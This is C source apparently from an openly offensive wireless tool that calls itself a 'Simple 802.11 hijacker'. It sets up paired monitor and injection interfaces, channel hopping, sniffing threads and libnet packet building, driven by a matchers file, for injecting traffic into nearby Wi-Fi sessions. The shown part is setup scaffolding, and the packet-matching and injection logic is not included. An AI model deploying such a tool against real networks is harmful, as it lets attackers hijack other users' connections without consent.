void *loop_thread(void *arg) {
    fd_set rfds;
    int retval;
    int caplen;
    u_char pkt[MAX_PACKET_LENGTH];

    struct ctx *ctx = (struct ctx *)arg;

    struct rx_info *rxi;
    rxi = malloc(sizeof(struct rx_info));

    logger(DBG, "Main loop started");
    while(1) {
        if(dead) {
            logger(DBG, "Got dead! Loop thread is closing now");
            return NULL;
        }

        bzero(rxi, sizeof(struct rx_info));

        FD_ZERO (&rfds);
        FD_SET (wi_fd(ctx->wi_mon), &rfds);
        retval = select (FD_SETSIZE, &rfds, NULL, NULL, NULL);
        if (retval == -1) {
            logger(DBG, "select() error");
        } else if (retval) {
            if (FD_ISSET (wi_fd(ctx->wi_mon), &rfds)) {
                caplen = wi_read (ctx->wi_mon, pkt, MAX_PACKET_LENGTH, rxi);
                if (caplen == -1) {
                    logger(DBG, "caplen == -1, wi_read return no packets");
                    continue;
                }
                pthread_mutex_lock (&(ctx->mutex));
                dot11_process(pkt, caplen, rxi, ctx);
                pthread_mutex_unlock (&(ctx->mutex));
            }
        }
    }
    return NULL;
}

int channel_change(struct ctx *ctx, int channel) {

    pthread_mutex_lock (&(ctx->mutex));

    if(wi_set_channel(ctx->wi_mon, channel) == -1) {
        logger(WARN, "Fail to set monitor interface channel to %d", channel);
        pthread_mutex_unlock (&(ctx->mutex));
        return 0;
    }

    // No need to change channel twice if mon == inj
    if((wi_fd(ctx->wi_mon) != wi_fd(ctx->wi_inj)) && wi_set_channel(ctx->wi_inj, channel) == -1) {
        logger(WARN, "Fail to set inject interface channel to %d", channel);
        pthread_mutex_unlock (&(ctx->mutex));
        return 0;
    }
    pthread_mutex_unlock (&(ctx->mutex));

    return 1;
}

// Channel switch thread
void *channel_thread(void *arg) {
    struct ctx *ctx = (struct ctx *)arg;

    u_int ch_c;

    if(ctx->channel_fix) {
        // set first in array
        logger(INFO, "Default channel set: %d", ctx->channels[0]);

        if(!channel_change(ctx, ctx->channels[0])) {
            return NULL;
        }

    } else {
        // enter loop
        while(1) {
            for(ch_c = 0; ch_c < sizeof(ctx->channels); ch_c++) {
                if(dead) {
                    logger(INFO, "Got dead! Channel thread is closing now");
                    return NULL;
                }
                if(!ctx->channels[ch_c]) break;
                logger(INFO, "Periodical channel change: %d", ctx->channels[ch_c]);
                if(!channel_change(ctx, ctx->channels[ch_c])) {
                    return NULL;
                }
                sleep(ctx->hop_time);
            }
        }
    }

    return NULL;
}

int main(int argc, char *argv[]) {

    int c;
    pthread_t loop_tid;
    pthread_t channel_tid;
    char lnet_err[LIBNET_ERRBUF_SIZE];

    int ch_c;
    char *ch;
    
    char *log_fn = NULL;
    char *matchers_fn = MATCHERS_DEFAULT_FILENAME;

    struct ctx *ctx = calloc(1, sizeof(struct ctx));

    if(ctx == NULL) {
        perror("calloc");
        exit(1);
    }

    ctx->channel_fix=0;
    ctx->mtu = MTU;
    ctx->hop_time = HOP_DEFAULT_TIMEOUT;

    // init libnet tags
    ctx->lnet_p_ip = ctx->lnet_p_tcp = ctx->lnet_p_udp = LIBNET_PTAG_INITIALIZER;

    printf ("%s - Simple 802.11 hijacker\n", argv[0]);
    printf ("-----------------------------------------------------\n\n");

    // This handles all of the command line arguments

    while ((c = getopt(argc, argv, "i:c:j:m:ft:l:k:hdu:")) != EOF) {
        switch (c) {
        case 'i':
            ctx->if_inj_name = strdup(optarg);
            ctx->if_mon_name = strdup(optarg);
            break;
        case 'j':
            ctx->if_inj_name = strdup(optarg);
            break;
        case 'm':
            ctx->if_mon_name = strdup(optarg);
            break;
        case 'c':
            ch_c = 0;
            ch = strtok(optarg, ",");
            while(ch != NULL) {
                if(atoi(ch) >0 && atoi(ch) <= 14 && ch_c < sizeof(ctx->channels)) {
                    ;
                    ctx->channels[ch_c] = atoi(ch);
                    ch_c++;
                }
                ch = strtok(NULL, ",");
            }
            ctx->channels[ch_c] = 0;
            break;
        case 'f':
            ctx->channel_fix = 1;
            break;
        case 't':
            ctx->hop_time = atoi(optarg);
            break;
        case 'l':
            log_fn = strdup(optarg);
            break;
        case 'k':
            matchers_fn = strdup(optarg);
            break;
        case 'h':
            usage(argv);
            break;
        case 'd':
            debugged = 1;
            break;
        case 'u':
            ctx->mtu = atoi(optarg);
            break;
        default:
            usage(argv);
            break;
        }
    }

    if (geteuid() != 0) {
        (void) fprintf(stderr, "You must be ROOT to run this!\n");
        return -1;
    }

    signal(SIGINT, sig_handler);

    if (ctx->if_inj_name == NULL || ctx->if_mon_name == NULL || !ctx->channels[0]) {
        (void) fprintf(stderr, "Interfaces or channel not set (see -h for more info)\n");
        return -1;
    }

    if(ctx->hop_time <= 0) {
        (void) fprintf(stderr, "Hop timeout must be > 0 (remember, it is defined in round seconds)\n");
        return -1;
    };

    if(ctx->mtu <= 0 || ctx->mtu > 1500) {
        (void) fprintf(stderr, "MTU must be > 0 and < 1500\n");
        return -1;
    }

    if(!(ctx->matchers_list = parse_matchers_file(matchers_fn))) {
        (void) fprintf(stderr, "Error during parsing matchers file: %s\n", matchers_fn);
        return -1;
    }

    if (!logger_init(log_fn)) {
        (void) fprintf(stderr, "Fail to open log file: %s (%s)\n", log_fn, strerror(errno));
        return -1;
    } else if(log_fn) {
        (void) fprintf(stderr, "Logging to file: %s\n", log_fn);
    }

    // Initiaize libnet context, so we can construct packets later. lo - because we just need any interface name here, and the name doesn`t matter.
    ctx->lnet = libnet_init(LIBNET_LINK_ADV, "lo", lnet_err);
    if(ctx->lnet == NULL) {
        logger(FATAL, "Error in libnet_init: %s", lnet_err);
        return -1;
    }

    
    // Open interfaces and prepare them for monitor/inject
    if(!(ctx->wi_mon = wi_open(ctx->if_mon_name))) {
        logger(FATAL, "Fail to initialize monitor interface: %s", ctx->if_mon_name);
        return -1;
    }
    wi_get_mac(ctx->wi_mon, ctx->if_mon_mac);
    logger(INFO, "Initialized %s interface for monitor. HW: %02x:%02x:%02x:%02x:%02x:%02x", wi_get_ifname(ctx->wi_mon), ctx->if_mon_mac[0], ctx->if_mon_mac[1], ctx->if_mon_mac[2], ctx->if_mon_mac[3], ctx->if_mon_mac[4], ctx->if_mon_mac[5]);
 
    if(!strcmp(ctx->if_inj_name, ctx->if_mon_name)) {
        logger(INFO, "Monitor and inject interfaces are the same, so inject == monitor");
        ctx->wi_inj = ctx->wi_mon;
    } else {
        if(!(ctx->wi_inj = wi_open(ctx->if_inj_name))) {
            logger(FATAL, "Fail to initialize inject interface: %s", ctx->if_inj_name);
            return -1;
        }
        wi_get_mac(ctx->wi_inj, ctx->if_inj_mac);
        logger(INFO, "Initialized %s interface for inject. HW: %02x:%02x:%02x:%02x:%02x:%02x", wi_get_ifname(ctx->wi_inj), ctx->if_inj_mac[0], ctx->if_inj_mac[1], ctx->if_inj_mac[2], ctx->if_inj_mac[3], ctx->if_inj_mac[4], ctx->if_inj_mac[5]);
    }

    // Set the channels we'll be monitor and inject on
    for (ch_c = 0; ch_c <= sizeof(ctx->channels); ch_c++) {
        if(!ctx->channels[ch_c]) break;
        if(ch_c == 0) {
            logger(INFO, "Using monitor and injection channel: %d (default if channel fix defined)", ctx->channels[ch_c]);
        } else {
            logger(INFO, "Using monitor and injection channel: %d", ctx->channels[ch_c]);
        }
    }

    if ((pthread_mutex_init (&(ctx->mutex), NULL)) != 0) {
        logger(FATAL, "pthread mutex initialization failed");
        return -1;
    }   

    // Main sniffing thread
    if(pthread_create(&loop_tid, NULL, loop_thread, ctx)) {
        logger(FATAL, "Error in pcap pthread_create");
        return -1;
    }

    // Channel switch thread
    if(pthread_create(&channel_tid, NULL, channel_thread, ctx)) {
        logger(FATAL, "Error in channel pthread_create");
        return -1;
    }

    // Wait for threads to join
    if(pthread_join(channel_tid, NULL)) {
        logger(FATAL, "Error joining channel thread");
    }
    if(pthread_join(loop_tid, NULL)) {
        logger(FATAL, "Error joining pcap thread");
    }

    logger(INFO, "We are done");

    return 0;
}

